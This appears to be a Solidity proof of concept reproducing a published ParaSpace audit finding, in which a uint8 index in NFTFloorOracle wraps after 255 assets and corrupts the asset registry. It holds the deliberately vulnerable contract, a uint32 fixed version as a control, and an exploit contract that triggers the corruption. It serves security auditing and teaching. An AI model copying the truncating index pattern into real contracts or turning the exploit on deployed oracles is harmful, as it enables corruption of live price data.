// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of ParaSpace finding 25724 (H-08):
// "NFTFloorOracle's asset and feeder structures can be corrupted".
//
// NFTFloorOracle stores each asset's position in the `assets` array inside a
// `uint8 index` field, assigned via `uint8(assets.length - 1)`. `_removeAsset`
// zeroes an array slot with `delete assets[assetIndex]` (it never pops, so the
// array only grows). Once more than 255 assets have ever been registered, the
// uint8 cast truncates: the 257th distinct asset gets stored index
// uint8(256) == 0, which COLLIDES with the very first asset's index (0).
// Calling `_removeAsset` on that 257th asset then reads index 0 and executes
// `delete assets[0]`, destroying an EXISTING, still-registered asset's slot
// while the 257th asset's own accounting is the thing being removed. The
// registry becomes internally inconsistent (assets[0] == address(0) yet
// assetFeederMap[asset#1].registered == true), permanently corrupting the
// oracle: loss of admin control, mispricing, and DoS.
//
// The vulnerable structs and the `_addAsset` / `_removeAsset` / `_addFeeder` /
// `_removeFeeder` bodies below are byte-identical to the audited source at
// code-423n4/2022-11-paraspace @ c6820a2
// (paraspace-core/contracts/misc/NFTFloorOracle.sol). Only the OpenZeppelin
// AccessControl base (opaque, out-of-scope) is replaced by a minimal double,
// and the `onlyRole` gating on the external entry points is dropped — neither
// is the bug; the harm is the uint8 index truncation.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin AccessControl (opaque dep, not
///      the bug). Provides just what the verbatim feeder logic references.
contract AccessControlLite {
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    mapping(bytes32 => mapping(address => bool)) internal _roles;

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    function _setupRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    function revokeRole(bytes32 role, address account) public {
        _roles[role][account] = false;
    }
}

/// @dev Minimal ERC20 double used only as the SINK harm marker.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Verbatim structs from the audited source (L22-L48).
// ─────────────────────────────────────────────────────────────────────────────
struct PriceInformation {
    // last reported floor price(offchain twap)
    uint256 twap;
    // last updated blocknumber
    uint256 updatedAt;
    // last updated timestamp
    uint256 updatedTimestamp;
}

struct FeederRegistrar {
    // if asset registered or not
    bool registered;
    // index in asset list
    uint8 index; // @> uint8 caps the asset registry at 255 slots; index wraps past that
    // if asset paused,reject the price
    bool paused;
    // feeder -> PriceInformation
    mapping(address => PriceInformation) feederPrice;
}

struct FeederPosition {
    // if feeder registered or not
    bool registered;
    // index in feeder list
    uint8 index;
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: NFTFloorOracle asset/feeder machinery, verbatim.
// ─────────────────────────────────────────────────────────────────────────────
contract NFTFloorOracle is AccessControlLite {
    event AssetAdded(address indexed asset);
    event AssetRemoved(address indexed asset);
    event FeederAdded(address indexed feeder);
    event FeederRemoved(address indexed feeder);

    bytes32 public constant UPDATER_ROLE = keccak256("UPDATER_ROLE");

    /// @dev Aggregated price with address
    mapping(address => PriceInformation) public assetPriceMap;

    /// @dev All feeders
    address[] public feeders;

    /// @dev feeder map
    mapping(address => FeederPosition) private feederPositionMap;

    /// @dev All asset list
    address[] public assets;

    /// @dev Original raw value to aggregate with
    mapping(address => FeederRegistrar) public assetFeederMap;

    modifier onlyWhenAssetExisted(address _asset) {
        require(_isAssetExisted(_asset), "NFTOracle: asset not existed");
        _;
    }

    modifier onlyWhenAssetNotExisted(address _asset) {
        require(!_isAssetExisted(_asset), "NFTOracle: asset existed");
        _;
    }

    modifier onlyWhenFeederExisted(address _feeder) {
        require(_isFeederExisted(_feeder), "NFTOracle: feeder not existed");
        _;
    }

    modifier onlyWhenFeederNotExisted(address _feeder) {
        require(!_isFeederExisted(_feeder), "NFTOracle: feeder existed");
        _;
    }

    // ── external entry points (onlyRole gating dropped — not the bug) ──────────
    function addAssets(address[] calldata _assets) external {
        _addAssets(_assets);
    }

    function removeAsset(address _asset) external onlyWhenAssetExisted(_asset) {
        _removeAsset(_asset);
    }

    function addFeeders(address[] calldata _feeders) external {
        _addFeeders(_feeders);
    }

    function removeFeeder(address _feeder) external onlyWhenFeederExisted(_feeder) {
        _removeFeeder(_feeder);
    }

    // ── verbatim internals ─────────────────────────────────────────────────────
    function _isAssetExisted(address _asset) internal view returns (bool) {
        return assetFeederMap[_asset].registered;
    }

    function _isFeederExisted(address _feeder) internal view returns (bool) {
        return feederPositionMap[_feeder].registered;
    }

    function _addAsset(address _asset)
        internal
        onlyWhenAssetNotExisted(_asset)
    {
        assetFeederMap[_asset].registered = true;
        assets.push(_asset);
        assetFeederMap[_asset].index = uint8(assets.length - 1); // @> truncates: asset #257 gets index uint8(256)==0, colliding with asset #1
        emit AssetAdded(_asset);
    }

    /// @notice add nft assets.
    /// @param _assets assets to add
    function _addAssets(address[] memory _assets) internal {
        for (uint256 i = 0; i < _assets.length; i++) {
            _addAsset(_assets[i]);
        }
    }

    function _removeAsset(address _asset)
        internal
        onlyWhenAssetExisted(_asset)
    {
        uint8 assetIndex = assetFeederMap[_asset].index;
        delete assets[assetIndex]; // @> with a collided index, this zeroes the WRONG (existing) asset's slot
        delete assetPriceMap[_asset];
        delete assetFeederMap[_asset];
        emit AssetRemoved(_asset);
    }

    function _addFeeder(address _feeder)
        internal
        onlyWhenFeederNotExisted(_feeder)
    {
        feeders.push(_feeder);
        feederPositionMap[_feeder].index = uint8(feeders.length - 1); // @> same uint8 truncation on the feeder registry
        feederPositionMap[_feeder].registered = true;
        _setupRole(UPDATER_ROLE, _feeder);
        emit FeederAdded(_feeder);
    }

    /// @notice set feeders.
    /// @param _feeders feeders to set
    function _addFeeders(address[] memory _feeders) internal {
        for (uint256 i = 0; i < _feeders.length; i++) {
            _addFeeder(_feeders[i]);
        }
    }

    function _removeFeeder(address _feeder)
        internal
        onlyWhenFeederExisted(_feeder)
    {
        uint8 feederIndex = feederPositionMap[_feeder].index;
        if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {
            feeders[feederIndex] = feeders[feeders.length - 1];
            feeders.pop();
        }
        delete feederPositionMap[_feeder];
        revokeRole(UPDATER_ROLE, _feeder);
        emit FeederRemoved(_feeder);
    }

    // view helpers for the driver / exploit
    function assetsLength() external view returns (uint256) {
        return assets.length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: identical logic but the index field and casts use uint32
// (the auditor's recommended mitigation). No truncation → removal zeroes the
// asset's OWN slot and leaves earlier assets intact.
// ─────────────────────────────────────────────────────────────────────────────
struct FeederRegistrar32 {
    bool registered;
    uint32 index; // FIX: uint32 index — no truncation up to 2^32-1 assets
    bool paused;
    mapping(address => PriceInformation) feederPrice;
}

contract NFTFloorOracleFixed is AccessControlLite {
    bytes32 public constant UPDATER_ROLE = keccak256("UPDATER_ROLE");

    mapping(address => PriceInformation) public assetPriceMap;
    address[] public assets;
    mapping(address => FeederRegistrar32) public assetFeederMap;

    modifier onlyWhenAssetExisted(address _asset) {
        require(_isAssetExisted(_asset), "NFTOracle: asset not existed");
        _;
    }

    modifier onlyWhenAssetNotExisted(address _asset) {
        require(!_isAssetExisted(_asset), "NFTOracle: asset existed");
        _;
    }

    function addAssets(address[] calldata _assets) external {
        for (uint256 i = 0; i < _assets.length; i++) {
            _addAsset(_assets[i]);
        }
    }

    function removeAsset(address _asset) external onlyWhenAssetExisted(_asset) {
        _removeAsset(_asset);
    }

    function _isAssetExisted(address _asset) internal view returns (bool) {
        return assetFeederMap[_asset].registered;
    }

    function _addAsset(address _asset)
        internal
        onlyWhenAssetNotExisted(_asset)
    {
        assetFeederMap[_asset].registered = true;
        assets.push(_asset);
        assetFeederMap[_asset].index = uint32(assets.length - 1); // FIX
    }

    function _removeAsset(address _asset)
        internal
        onlyWhenAssetExisted(_asset)
    {
        uint32 assetIndex = assetFeederMap[_asset].index;
        delete assets[assetIndex];
        delete assetPriceMap[_asset];
        delete assetFeederMap[_asset];
    }

    function assetsLength() external view returns (uint256) {
        return assets.length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: register 257 distinct assets so asset #257's stored uint8
// index wraps to 0 and collides with asset #1; removing asset #257 then zeroes
// asset #1's still-registered array slot. Harm (an existing oracle entry
// corrupted while marked registered) is recorded on a MARKER token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint160 internal constant ASSET_BASE = 0x1000; // asset #(i+1) == ASSET_BASE + i
    uint256 internal constant NUM_ASSETS = 257;    // one past the uint8 limit

    // exposed results
    address public vulnAddr;
    address public fixedAddr;
    address public markerAddr;
    address public asset1;
    address public asset257;

    // buggy-path harm
    bool public buggySlotZeroed;               // assets[0] (asset #1) destroyed
    bool public buggyAsset1StillRegistered;    // yet asset #1 still "registered"
    uint8 public buggyAsset257Index;           // == 0 (collided with asset #1)

    // negative control (fixed uint32 variant)
    bool public fixedSlotIntact;               // assets[0] still == asset #1
    bool public fixedAsset1StillRegistered;    // and still registered
    bool public fixedOwnSlotZeroed;            // asset #257's OWN slot removed

    uint256 public sinkMarkerBalance;

    function run() external payable {
        NFTFloorOracle vuln = new NFTFloorOracle();       // deploy 0
        NFTFloorOracleFixed fixedOracle = new NFTFloorOracleFixed(); // deploy 1
        MiniToken marker = new MiniToken("Corrupted Oracle Asset", "CORRUPT-ASSET"); // deploy 2

        vulnAddr = address(vuln);
        fixedAddr = address(fixedOracle);
        markerAddr = address(marker);

        // Build 257 distinct, non-zero asset addresses.
        address[] memory batch = new address[](NUM_ASSETS);
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            batch[i] = address(ASSET_BASE + uint160(i));
        }
        asset1 = batch[0];              // stored index 0
        asset257 = batch[NUM_ASSETS - 1]; // stored index uint8(256) == 0 (collision)

        // ── BUGGY PATH ────────────────────────────────────────────────────────
        vuln.addAssets(batch);
        ( , buggyAsset257Index, ) = vuln.assetFeederMap(asset257);

        // Remove asset #257: reads collided index 0 -> delete assets[0] (asset #1).
        vuln.removeAsset(asset257);

        buggySlotZeroed = (vuln.assets(0) == address(0));
        (bool reg1, , ) = vuln.assetFeederMap(asset1);
        buggyAsset1StillRegistered = reg1;

        // ── NEGATIVE CONTROL (fixed uint32 variant) ────────────────────────────
        fixedOracle.addAssets(batch);
        fixedOracle.removeAsset(asset257);
        fixedSlotIntact = (fixedOracle.assets(0) == asset1);
        (bool freg1, , ) = fixedOracle.assetFeederMap(asset1);
        fixedAsset1StillRegistered = freg1;
        fixedOwnSlotZeroed = (fixedOracle.assets(NUM_ASSETS - 1) == address(0));

        // ── HARM ────────────────────────────────────────────────────────────────
        // The registry is now inconsistent: an existing, still-registered asset's
        // array slot was zeroed. Record 1 corrupted entry at the SINK.
        require(buggySlotZeroed, "asset #1 array slot not corrupted");
        require(buggyAsset1StillRegistered, "asset #1 no longer registered");
        require(buggyAsset257Index == 0, "index did not collide");

        marker.mint(SINK, 1 ether); // 1 corrupted oracle asset entry
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
